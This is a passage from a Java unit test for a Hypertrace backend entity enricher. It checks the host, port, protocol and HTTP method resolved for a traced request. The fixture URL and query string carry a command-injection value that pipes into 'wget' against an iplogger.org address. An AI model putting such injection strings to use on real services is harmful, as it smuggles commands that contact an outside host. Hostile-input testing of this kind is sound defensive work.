                            AttributeValue.newBuilder().setValue("dataservice:9394").build()))
                    .build())
            .setEventName("Sent./api/timelines")
            .setStartTimeMillis(1566869077746L)
            .setEndTimeMillis(1566869077750L)
            .setMetrics(
                Metrics.newBuilder()
                    .setMetricMap(
                        Map.of("Duration", MetricValue.newBuilder().setValue(4.0).build()))
                    .build())
            .setEventRefList(
                Arrays.asList(
                    EventRef.newBuilder()
                        .setTraceId(ByteBuffer.wrap("random_trace_id".getBytes()))
                        .setEventId(ByteBuffer.wrap("random_event_id".getBytes()))
                        .setRefType(EventRefType.CHILD_OF)
                        .build()))
            .setHttp(
                org.hypertrace.core.datamodel.eventfields.http.Http.newBuilder()
                    .setRequest(
                        Request.newBuilder()
                            .setUrl(
                                "http://dataservice:9394/api/timelines?uri=|%20wget%20https://iplogger.org/1pzQq7")
                            .setHost("dataservice:9394")
                            .setPath("/api/timelines")
                            .setQueryString("uri=|%20wget%20https://iplogger.org/1pzQq")
                            .build())
                    .build())
            .build();

    final Entity backendEntity =
        backendEntityEnricher.resolve(e, structuredTrace, structuredTraceGraph).get().getEntity();
    assertEquals(backendEntity.getEntityName(), "dataservice:9394");
    assertEquals(3, backendEntity.getIdentifyingAttributesCount());
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PROTOCOL))
            .getValue()
            .getString(),
        "HTTP");
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_HOST))
            .getValue()
            .getString(),
        "dataservice");
    assertEquals(
        backendEntity
            .getIdentifyingAttributesMap()
            .get(Constants.getEntityConstant(BackendAttribute.BACKEND_ATTRIBUTE_PORT))
            .getValue()
            .getString(),
        "9394");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT))
            .getValue()
            .getString(),
        "Sent./api/timelines");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getEnrichedSpanConstant(Backend.BACKEND_FROM_EVENT_ID))
            .getValue()
            .getString(),
        "62646630336466616266356337306638");
    assertEquals(
        backendEntity
            .getAttributesMap()
            .get(Constants.getRawSpanConstant(Http.HTTP_METHOD))
            .getValue()
            .getString(),
        "GET");
  }

  static class MockBackendEntityEnricher extends AbstractBackendEntityEnricher {

    @Override
    public void setup(Config enricherConfig, ClientRegistry clientRegistry) {}

    @Override
    public List<BackendProvider> getBackendProviders() {
      return List.of(new HttpBackendProvider());
    }

    @Override
    public FqnResolver getFqnResolver() {
      return new HypertraceFqnResolver();
    }
  }
}
